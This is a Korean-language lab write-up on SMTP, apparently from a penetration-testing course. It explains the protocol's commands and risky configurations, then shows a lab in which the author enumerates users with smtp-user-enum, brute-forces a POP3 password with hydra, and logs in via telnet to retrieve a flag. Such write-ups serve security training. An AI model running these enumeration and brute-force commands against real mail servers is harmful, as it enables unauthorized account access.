---
title: "SMTP"
date: 2025-09-27
layout: single
author_profile: true
toc: true
toc_label: "SMTP"
toc_icon: "mail"
toc_sticky: true
header:
  teaser: /assets/network-screenshots/smtp/smtp.png
tags: [network, smtp]
difficulty: "Medium"
arch: linux
---

**SMTP (Simple Mail Transfer Protocol)** 는 IP 네트워크에서 이메일을 전송하기 위한 프로토콜이다. 클라이언트와 메일 서버 간, 또는 SMTP 서버끼리 메일을 전달할 때 사용된다. 일반적으로 수신에는 IMAP/POP3가 병행된다.

기본 포트는 **TCP/25** 이지만, 인증·암호화를 사용하는 제출/클라이언트 연결에는 **TCP/587**, 암호화 전용 포트로 **TCP/465** 등이 사용된다. STARTTLS 확장을 통해 기존 평문 연결을 TLS로 전환할 수 있다.

SMTP는 원래 평문 프로토콜이므로 **인증 정보와 명령이 그대로 전송**될 수 있다. 따라서 서버가 STARTTLS 또는 SMTPS 등의 암호화 설정을 하지 않으면 네트워크 상에서 계정정보가 유출될 위험이 있다.

---

# 기본 동작

![Domain](/assets/network-screenshots/smtp/smtp-imap.png)

- 클라이언트(MUA) → Mail Submission Agent(MSA) → Mail Transfer Agent(MTA) → Mail Delivery Agent(MDA) → Mailbox(POP3/IMAP)

- 전송 흐름: 클라이언트가 SMTP 서버에 접속하여 `MAIL FROM`, `RCPT TO`, `DATA` 명령으로 메일을 제출한다. 서버는 DNS를 통해 수신측 MTA 주소를 검색해 전송을 이어간다.

---

# 주요 명령어

| 명령어 | 설명 |
|---|---|
| HELO/EHLO | 세션 시작(클라이언트 식별) |
| MAIL FROM | 발신자 지정 |
| RCPT TO | 수신자 지정 |
| DATA | 본문 전송 시작(마침표 줄로 종료) |
| AUTH | 인증(예: AUTH PLAIN, AUTH LOGIN) |
| VRFY, EXPN | 사용자/메일박스 검증(서버 설정에 따라 동작 다름) |
| STARTTLS | TLS로 전환 |
| QUIT | 세션 종료 |

---

# 기본 구성

```bash
$ cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"

smtpd_banner = ESMTP Server
myhostname = mail1.inlanefreight.htb
mynetworks = 127.0.0.0/8 10.129.0.0/16
mailbox_size_limit = 0
inet_protocols = ipv4
smtpd_helo_restrictions = reject_invalid_hostname
home_mailbox = /home/postfix
```

---

# 위험한 설정

| 명령어 | 설명 |
|---|---|
| 평문 전송 | TLS 미사용 시 인증정보와 메시지 내용이 노출 |
| Open Relay | `mynetworks = 0.0.0.0/0` 같은 잘못된 설정은 제3자가 스팸 발송에 악용 |
| VRFY/EXPN로 사용자 열거 | 서버 설정에 따라 계정 존재 여부를 유추 |
| 버전/구성 노출 | 배너나 EHLO 응답으로 제품/기능 노출 시 알려진 취약점 탐색 가능 |

---

# 명령어 예시

## 1. 서버 연결(기본)

```bash
$ telnet 10.129.14.128 25

Trying 10.129.14.128...
Connected to 10.129.14.128.
Escape character is '^]'.
220 ESMTP Server

HELO mail1.inlanefreight.htb

250 mail1.inlanefreight.htb
```

## 2. 기능 확인 (EHLO)

```bash
EHLO mail1

250-PIPELINING
250-SIZE 10240000
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250-SMTPUTF8
250 CHUNKING
```

## 3. 사용자 열거 (VRFY)

```bash
VRFY root

252 2.0.0 root

VRFY victim

252 2.0.0 victim
```

> VRFY 응답은 구성에 따라 임의로 긍정(252)만 반환하도록 설정될 수 있으므로, 단독으로 계정 존재를 확신하지 말아야 한다.

## 4. 임의 메일 전송

```bash
EHLO inlanefreight.htb

MAIL FROM:<attacker@inlanefreight.htb>

RCPT TO:<victim@inlanefreight.htb> NOTIFY=success,failure

DATA

From: attacker@inlanefreight.htb
To: victim@inlanefreight.htb
Subject: Test
Hello
.

QUIT
250 2.0.0 Ok: queued as <ID>
221 2.0.0 Bye
```

---

# 실습

## Portscan

먼저 대상 Host(`10.129.179.133`)에 대해 기본 스크립트와 서비스 버전 탐지를 수행하였다.

```bash
$ nmap -sC -sV 10.129.179.133
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-27 17:14 EDT
Nmap scan report for 10.129.179.133
Host is up (0.26s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: WIN-02, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
110/tcp  open  pop3          hMailServer pop3d
|_pop3-capabilities: USER UIDL TOP
143/tcp  open  imap          hMailServer imapd
|_imap-capabilities: QUOTA NAMESPACE ACL RIGHTS=texkA0001 CHILDREN IMAP4 CAPABILITY OK IMAP4rev1 IDLE SORT completed
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: WIN-02, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-02
|   NetBIOS_Domain_Name: WIN-02
|   NetBIOS_Computer_Name: WIN-02
|   DNS_Domain_Name: WIN-02
|   DNS_Computer_Name: WIN-02
|   Product_Version: 10.0.17763
|_  System_Time: 2025-09-27T21:14:53+00:00
|_ssl-date: 2025-09-27T21:14:57+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=WIN-02
| Not valid before: 2025-09-26T21:09:18
|_Not valid after:  2026-03-28T21:09:18
Service Info: Host: WIN-02; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.50 seconds
```

Nmap 스캔을 통해 총 4개의 주요 서비스(`SMTP`, `POP3`, `IMAP` `RDP`)가 확인되었다.

## SMTP 브루트포싱

문제에서 제공된 `inlanefreight.htb` 도메인을 대상으로 `smtp-user-enum` 명령어를 이용해 `RCPT` 모드로 사용자 아이디 브루트포싱을 수행했다.

```bash
$ smtp-user-enum -M RCPT -U ./Desktop/users.list -D inlanefreight.htb -t 10.129.179.133
```

브루트포싱 결과, `marlin@inlanefreight.htb` 계정이 유효한 것으로 확인되었다. 

![Domain](/assets/network-screenshots/smtp/smtp-brute-force.png)

## POP3 비밀번호 브루트포싱

`marlin@inlanefreight.htb` 계정에 대해 `hydra`를 사용해 POP3 비밀번호 브루트포싱을 시도하였다.

```bash
hydra -l marlin@inlanefreight.htb -P ./Desktop/pws.list -f 10.129.179.133 pop3
```

브루트포싱 결과 `marlin@inlanefreight.htb` 계정의 비밀번호가 `poohbear` 로 확인되었다.

![Domain](/assets/network-screenshots/smtp/pop3-hydra.png)

## telnet POP3 접속

POP3 관련 절차는 별도 포스트에 있습니다 → [POP3 포스트 보기](../imap-pop3).

`telnet`로 POP3 프토토콜에 접속하여 브루트포싱으로 획득한 자격증명으로 로그인 성공을 확인하였다.

```bash
$ telnet 10.129.179.133 110
Trying 10.129.179.133...
Connected to 10.129.179.133.
Escape character is '^]'.
+OK POP3
USER marlin@inlanefreight.htb
+OK Send your password
PASS poohbear
+OK Mailbox locked and ready
```

## Flag 획득 

이후, `LIST` 명령어로 메시지 존재 여부를 확인하였다.

```bash
LIST

+OK 1 messages (601 octets)
1 601
.
```

그 후, `RETR 1` 명령어를 활용하여 메세지를 열람한 결과

![Domain](/assets/network-screenshots/smtp/flag.png)

이렇게 최종적으로 **flag**를 확보할 수 있었다.